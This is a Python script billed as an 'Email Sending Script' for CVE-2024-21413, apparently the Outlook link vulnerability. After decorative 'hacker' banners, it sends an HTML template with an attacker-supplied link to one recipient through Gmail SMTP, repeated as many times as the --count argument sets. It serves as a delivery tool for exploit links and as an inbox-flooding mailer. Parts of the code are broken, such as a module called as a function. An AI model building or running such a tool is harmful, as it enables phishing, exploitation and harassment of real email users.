import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import argparse
from colorama import Fore, Style, init
import re  
import sys
from time import sleep
import platform
import colorama
import bgtask
from subprocess import (
    DEVNULL,
    PIPE,
    Popen,
    STDOUT,
    call,
    run
)
colorama.init(autoreset=True)
class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def is_running(process):
    exit_code = bgtask(f"pidof {process}").wait()
    if exit_code == 0:
        return True
    return False
def sprint(text, second=0.05, color=colors.ENDC):
    for line in text + '\n':
        sys.stdout.write(color + line + colors.ENDC)  
        sys.stdout.flush()       
        sleep(second)

def print_header():
    print(f"{colors.HEADER}{colors.BOLD}{'=' * 95}")
    print(f"{colors.OKBLUE}{colors.BOLD}Email Sending Script CVE-2024-21413{colors.ENDC} Developed by https://github.com/ThemeHacker")
    print(f"{colors.HEADER}{'=' * 95}{colors.ENDC}")
import time
import sys
from colorama import Fore, Style, init

colorama.init(autoreset=True)

def hacker_text_effect(text, delay=0.05):
    """Prints text with a typing effect."""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  

def hacker_theme():
    print(Fore.GREEN + "Initializing...")
    time.sleep(1)

    hacker_text_effect("「S͜͡y͜͡s͜͡t͜͡e͜͡m͜͡」 Boot Sequence Initiated...")
    time.sleep(1)

    hacker_text_effect("⚡ Powering Up... ⚡", 0.1)
    time.sleep(1)

    print("ⒶⒸⒸⒺⓈⓈ ⒼⓇⒶⓃⓉⒺⒹ")
    time.sleep(1)

    print("""
    ┌─────────────────────┐
    │     SYSTEM BOOT      │
    ├─────────────────────┤
    │ USER AUTHORIZATION   │
    │ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ │
    │ ACCESS GRANTED       │
    └─────────────────────┘
    """)
    
    hacker_text_effect("[Connected to the mainframe]", 0.03 )
    hacker_text_effect("{C͞o͞n͞n͞e͞c͞t͞e͞d͞}", 0.03)
def ascii_emailtools():
    __name__ = "HAcKeRTHeme"
    __version__ ="2.4.6"
    print("") 
    init(autoreset=True)  
    art = [
        "███████╗███╗   ███╗ █████╗ ██╗██╗         ████████╗ ██████╗  ██████╗ ██╗     ███████╗",
        "██╔════╝████╗ ████║██╔══██╗██║██║         ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝",
        "█████╗  ██╔████╔██║███████║██║██║            ██║   ██║   ██║██║   ██║██║     ███████╗",
        "██╔══╝  ██║╚██╔╝██║██╔══██║██║██║            ██║   ██║   ██║██║   ██║██║     ╚════██║",
        "███████╗██║ ╚═╝ ██║██║  ██║██║███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║",
        "╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝"
    ]
    colors_list = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    for i, line in enumerate(art):
        print(colors_list[i % len(colors_list)] + line)
    sprint("Welcome to Email Tools! " + f'By {__name__}' + f' Version: {__version__}')
def check_and_clear():
    current_platform = platform.system()
    if current_platform == "Windows":
        os.system("cls")
        return "Clearing screen in Windows."
    elif current_platform == "Linux":
        os.system("clear")
        return "Clearing screen in Linux."
    else:
        return "Unknown platform. Cannot clear screen."

def is_valid_email(email):
    """Check if the provided email is valid."""
    regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(regex, email) is not None

def send_email(receiver_email, subject, link_content=None, email_number=1):
    sender_email = os.getenv('SENDER_EMAIL')
    sender_password = os.getenv('SENDER_PASSWORD')
    if not sender_email or not sender_password:
        print(f"{colors.FAIL}Error: Sender email and password must be set in environment variables.{colors.ENDC}")
        return

    if not is_valid_email(receiver_email):
        print(f"{colors.FAIL}Error: Invalid recipient email address: {receiver_email}.{colors.ENDC}")
        return

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    
    with open("template/Stripo.html", "r") as html_file:
        html_content = html_file.read()
    html_content = html_content.replace("{receiver_email}", receiver_email)
    if link_content:
        html_content = html_content.replace("{link_content}", link_content)
    else:
        html_content = html_content.replace("{link_content}", "#") 
    msg.attach(MIMEText(html_content, 'html'))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
            print(f"{colors.OKGREEN}Email sent successfully {email_number} to {receiver_email}.{colors.ENDC}")
    except smtplib.SMTPAuthenticationError:
        print(f"{colors.FAIL}Authentication failed. Check your email and password.{colors.ENDC}")
    except smtplib.SMTPConnectError:
        print(f"{colors.FAIL}Could not connect to the SMTP server. Check your network settings.{colors.ENDC}")
    except Exception as e:
        print(f"{colors.FAIL}Failed to send email {email_number} to {receiver_email}: {e}{colors.ENDC}")

if __name__ == "__main__":
    
    print_header()
    hacker_theme()
    ascii_emailtools()

    parser = argparse.ArgumentParser(description='Send emails using Gmail SMTP.')
    parser.add_argument('--recipient', required=True, help='Recipient email address')
    parser.add_argument('--subject', required=True, help='Subject of the email')
    parser.add_argument('--link', required=False, help='Optional link to include in the email')
    parser.add_argument('--count', type=int, required=True, help='Number of times to send the email')

    args = parser.parse_args()

    for i in range(1, args.count + 1):
        try:
            send_email(args.recipient, args.subject, args.link, i)
        except KeyboardInterrupt:
            print(Fore.RED + f'ERROR')
